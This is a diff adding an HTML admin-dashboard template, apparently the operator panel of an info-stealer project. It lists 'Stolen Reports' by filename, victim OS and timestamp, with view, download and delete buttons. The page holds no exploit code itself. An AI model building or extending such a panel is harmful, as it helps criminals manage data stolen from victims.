@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="{{ lang }}">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ t('project_title') }} – Admin Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        body { background: #f8fafc; transition: background 0.3s; }
+        .card { box-shadow: 0 4px 24px rgba(0,0,0,0.08); transition: background 0.3s, color 0.3s; }
+        .navbar-brand { font-weight: bold; font-size: 1.3rem; }
+        .dark-mode { background: #181a1b !important; color: #e0e0e0 !important; }
+        .dark-mode .card { background: #23272b !important; color: #e0e0e0 !important; }
+        .dark-mode .table { color: #e0e0e0; }
+        .dark-mode .table-striped > tbody > tr:nth-of-type(odd) { background: #23272b; }
+        .dark-mode .btn-primary { background: #375a7f; border-color: #375a7f; }
+        .dark-mode .btn-danger { background: #c82333; border-color: #bd2130; }
+        .dark-mode .btn-secondary { background: #444; border-color: #444; }
+        .dark-mode .alert-success { background: #1e4620; color: #fff; border-color: #1e4620; }
+        .dark-mode .alert-info { background: #0c5460; color: #fff; border-color: #0c5460; }
+        .dark-mode .alert-danger { background: #842029; color: #fff; border-color: #842029; }
+        .footer { font-size: 0.95rem; color: #888; margin-top: 2rem; text-align: center; }
+        .action-btns .btn { margin-right: 0.25rem; }
+        .badge { font-size: 1rem; }
+        @media (max-width: 576px) { .card { margin: 1rem 0; } .navbar-brand { font-size: 1rem; } }
+    </style>
+</head>
+<body>
+<nav class="navbar navbar-expand-lg navbar-light bg-light mb-2 shadow-sm">
+    <div class="container">
+        <a class="navbar-brand d-flex align-items-center" href="/">
+            <span style="font-size:1.5rem; margin-right:0.5rem;">🔐</span> {{ t('project_title') }}
+        </a>
+        <div class="ms-auto d-flex align-items-center">
+            <button id="toggleDark" class="btn btn-outline-secondary me-2" title="{{ t('toggle_dark') }}">
+                <span id="darkIcon">🌙</span>
+            </button>
+            <div class="dropdown">
+                <button class="btn btn-outline-secondary dropdown-toggle" type="button" id="langDropdown" data-bs-toggle="dropdown" aria-expanded="false">
+                    🌐 {% if lang == 'hi' %}{{ t('hindi') }}{% else %}{{ t('english') }}{% endif %}
+                </button>
+                <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="langDropdown">
+                    {% for code, name in LANGUAGES.items() %}
+                        <li><a class="dropdown-item {% if code == lang %}active{% endif %}" href="{{ url_for('set_language', lang=code) }}">{{ name }}</a></li>
+                    {% endfor %}
+                </ul>
+            </div>
+        </div>
+    </div>
+</nav>
+<div class="container py-4">
+    <div class="mb-3 d-flex justify-content-between align-items-center">
+        <div>
+            <span class="badge bg-info"><i class="fa-solid fa-database"></i> {{ t('Total Reports:') }} {{ total_reports }}</span>
+            <span class="badge bg-success"><i class="fa-solid fa-desktop"></i> {{ t('Most Common OS:') }} {{ most_common_os }}</span>
+        </div>
+        <div>
+            <a href="/admin/download_all" class="btn btn-sm btn-primary"><i class="fa-solid fa-download"></i> {{ t('download_report') }}</a>
+            <a href="/admin/logout" class="btn btn-sm btn-secondary"><i class="fa-solid fa-sign-out-alt"></i> Logout</a>
+        </div>
+    </div>
+    {% with messages = get_flashed_messages(with_categories=true) %}
+      {% if messages %}
+        {% for category, message in messages %}
+          <div class="alert alert-{{ category }}" role="alert">{{ message }}</div>
+        {% endfor %}
+      {% endif %}
+    {% endwith %}
+    <div class="card p-3">
+        <h5 class="mb-3"><i class="fa-solid fa-list"></i> {{ t('Stolen Reports') }}</h5>
+        <div class="table-responsive">
+            <table class="table table-striped align-middle">
+                <thead>
+                    <tr>
+                        <th scope="col"><i class="fa-solid fa-file-alt"></i> {{ t('Filename') }}</th>
+                        <th scope="col"><i class="fa-solid fa-desktop"></i> {{ t('os') }}</th>
+                        <th scope="col"><i class="fa-solid fa-clock"></i> {{ t('Timestamp') }}</th>
+                        <th scope="col"><i class="fa-solid fa-cogs"></i> {{ t('Actions') }}</th>
+                    </tr>
+                </thead>
+                <tbody>
+                {% for report in reports %}
+                    <tr>
+                        <td>{{ report.filename }}</td>
+                        <td>{{ report.os }}</td>
+                        <td>{{ report.timestamp }}</td>
+                        <td class="action-btns">
+                            <a href="/admin/view/{{ report.filename }}" class="btn btn-sm btn-info" title="View"><i class="fa-solid fa-eye"></i></a>
+                            <a href="/admin/download/{{ report.filename }}" class="btn btn-sm btn-success" title="Download"><i class="fa-solid fa-download"></i></a>
+                            <form method="POST" action="/admin/delete/{{ report.filename }}" style="display:inline;" onsubmit="return confirm('{{ t('Delete this report?') }}');">
+                                <button type="submit" class="btn btn-sm btn-danger" title="Delete"><i class="fa-solid fa-trash"></i></button>
+                            </form>
+                        </td>
+                    </tr>
+                {% else %}
+                    <tr><td colspan="4" class="text-center">{{ t('No reports found.') }}</td></tr>
+                {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div class="footer">{{ t('footer') }}</div>
+</div>
+<script>
+    // Dark mode toggle logic
+    const toggleBtn = document.getElementById('toggleDark');
+    const darkIcon = document.getElementById('darkIcon');
+    function setDarkMode(on) {
+        if (on) {
+            document.body.classList.add('dark-mode');
+            localStorage.setItem('infonsare-dark', '1');
+            darkIcon.textContent = '☀️';
+        } else {
+            document.body.classList.remove('dark-mode');
+            localStorage.setItem('infonsare-dark', '0');
+            darkIcon.textContent = '🌙';
+        }
+    }
+    toggleBtn.addEventListener('click', function() {
+        setDarkMode(!document.body.classList.contains('dark-mode'));
+    });
+    if (localStorage.getItem('infonsare-dark') === '1') {
+        setDarkMode(true);
+    }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html> 
